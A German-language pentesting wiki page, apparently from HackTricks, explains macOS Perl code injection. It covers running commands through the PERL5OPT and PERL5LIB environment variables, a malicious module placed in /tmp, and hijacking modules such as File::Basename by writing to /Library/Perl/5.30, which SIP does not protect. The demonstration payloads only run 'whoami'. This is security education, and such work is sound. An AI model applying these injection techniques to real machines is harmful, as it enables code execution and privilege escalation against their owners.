# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariablen `PERL5OPT` & `PERL5LIB`

Mit der Umgebungsvariable PERL5OPT ist es möglich, perl beliebige Befehle ausführen zu lassen.\
Zum Beispiel, erstellen Sie dieses Skript:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Jetzt **exportiere die Umgebungsvariable** und führe das **perl** Skript aus:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Eine weitere Möglichkeit besteht darin, ein Perl-Modul zu erstellen (z. B. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Und dann die Umgebungsvariablen verwenden:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Über Abhängigkeiten

Es ist möglich, die Reihenfolge des Abhängigkeitsordners von Perl auszuführen:
```bash
perl -e 'print join("\n", @INC)'
```
Was etwas zurückgeben wird wie:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Einige der zurückgegebenen Ordner existieren nicht einmal, jedoch **existiert** **`/Library/Perl/5.30`**, es ist **nicht** **geschützt** durch **SIP** und es ist **vor** den Ordnern **geschützt durch SIP**. Daher könnte jemand diesen Ordner missbrauchen, um Skriptabhängigkeiten dort hinzuzufügen, sodass ein hochprivilegiertes Perl-Skript es lädt.

> [!WARNING]
> Beachten Sie jedoch, dass Sie **root sein müssen, um in diesen Ordner zu schreiben** und heutzutage erhalten Sie diese **TCC-Eingabeaufforderung**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Wenn ein Skript beispielsweise **`use File::Basename;`** importiert, wäre es möglich, **`/Library/Perl/5.30/File/Basename.pm`** zu erstellen, um beliebigen Code auszuführen.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
